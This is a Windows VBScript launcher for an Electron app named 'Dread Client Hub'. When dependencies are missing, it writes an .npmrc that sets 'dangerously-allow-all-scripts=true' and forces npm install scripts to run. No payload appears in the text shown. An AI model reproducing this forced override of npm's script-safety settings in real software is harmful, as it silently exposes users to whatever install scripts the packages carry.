' Silent launcher for Dread Client Hub (no console window).
' First-run / broken Electron: delegates to Launch_Dread_Client.bat so
' .npmrc + --no-ignore-scripts + install.js repair run reliably.
Option Explicit

Dim sh, fso, appDir, electron, pathTxt, bat, npmCmd, exitCode, healthy
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

appDir = fso.GetParentFolderName(WScript.ScriptFullName)
electron = appDir & "\node_modules\electron\dist\electron.exe"
pathTxt = appDir & "\node_modules\electron\path.txt"
bat = appDir & "\Launch_Dread_Client.bat"

healthy = fso.FileExists(electron) And fso.FileExists(pathTxt)

If Not healthy Then
  ' Console briefly: bat writes .npmrc, runs npm install --no-ignore-scripts,
  ' and repairs incomplete Electron binary installs.
  If fso.FileExists(bat) Then
    exitCode = sh.Run("cmd /c call """ & bat & """", 1, True)
    If exitCode <> 0 Then
      MsgBox "Failed to install or repair Dread Client Hub dependencies." & vbCrLf & _
             "Install Node.js LTS from https://nodejs.org, then try again." & vbCrLf & vbCrLf & _
             "If Electron still fails: delete node_modules\electron and re-run," & vbCrLf & _
             "or run: npm install --ignore-scripts=false", vbCritical, "Dread Client Hub"
      WScript.Quit 1
    End If
    ' Bat already started the Hub (npm start).
    WScript.Quit 0
  End If

  ' Fallback if bat is missing (odd installs).
  sh.Environment("PROCESS")("npm_config_ignore_scripts") = "false"
  sh.Environment("PROCESS")("ELECTRON_SKIP_BINARY_DOWNLOAD") = ""
  If Not fso.FileExists(appDir & "\.npmrc") Then
    Dim ts
    Set ts = fso.CreateTextFile(appDir & "\.npmrc", True)
    ts.WriteLine "ignore-scripts=false"
    ts.WriteLine "dangerously-allow-all-scripts=true"
    ts.Close
  End If
  npmCmd = "cmd /c ""cd /d """ & appDir & """ && set npm_config_ignore_scripts=false && npm.cmd install --no-ignore-scripts && if errorlevel 1 (pause & exit /b 1)"""
  exitCode = sh.Run(npmCmd, 1, True)
  If exitCode <> 0 Then
    MsgBox "Failed to install Dread Client Hub dependencies (npm install)." & vbCrLf & _
           "Install Node.js from https://nodejs.org and try again.", vbCritical, "Dread Client Hub"
    WScript.Quit 1
  End If
End If

If Not fso.FileExists(electron) Then
  MsgBox "Electron runtime not found after install:" & vbCrLf & electron & vbCrLf & vbCrLf & _
         "Delete node_modules\electron (or all of node_modules) and run Launch_Dread_Client.bat.", _
         vbCritical, "Dread Client Hub"
  WScript.Quit 1
End If

sh.CurrentDirectory = appDir
sh.Run """" & electron & """ .", 1, False
